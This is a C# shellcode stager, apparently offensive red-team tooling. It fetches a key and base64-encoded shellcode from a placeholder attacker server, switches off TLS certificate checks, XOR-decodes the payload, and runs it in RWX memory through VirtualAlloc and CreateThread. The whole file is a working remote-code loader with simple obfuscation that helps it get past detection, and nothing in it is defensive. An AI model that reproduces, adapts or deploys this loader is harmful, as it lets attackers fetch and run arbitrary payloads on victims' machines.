/*
This program fetch for key and shellcode on the attacker server.
Once decoded/deciphered, the shellcode is initialized the way you want.

*/
using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    string url = "https://ATTACKER IP/";
    Stager(url);
  }

  public static void Stager(string url)
  {
    WebClient wc = new WebClient();
    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

    //download shellcode in raw bytes
    //byte[] shellcode = wc.DownloadData(url);

    //download key, could be hardcoded
    string key = wc.DownloadString(url + "mykey").Trim();
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);

    //download base64 encoded shellcode
    string sbuf = wc.DownloadString(url + "shellcode");
    var buf = System.Convert.FromBase64String(sbuf);

    //de-xor
    byte[] shellcode = xor(buf, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }

  private static byte[] xor(byte[] shell, byte[] KeyBytes)
  {
      for (int i = 0; i < shell.Length; i++)
      {
          shell[i] ^= KeyBytes[i % KeyBytes.Length];
      }
      return shell;
  }
}